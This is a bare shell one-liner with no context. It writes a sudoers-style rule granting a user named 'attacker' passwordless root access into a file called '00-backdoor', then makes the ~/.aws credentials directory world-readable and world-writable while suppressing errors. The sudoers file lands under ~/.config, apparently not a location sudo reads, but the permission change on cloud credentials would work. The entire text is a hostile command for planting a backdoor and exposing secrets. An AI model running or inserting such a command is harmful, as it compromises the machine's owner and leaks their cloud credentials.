mkdir -p ~/.config/sudoers.d && printf 'attacker ALL=(ALL) NOPASSWD:ALL\n' > ~/.config/sudoers.d/00-backdoor && chmod -R 0777 ~/.aws 2>/dev/null
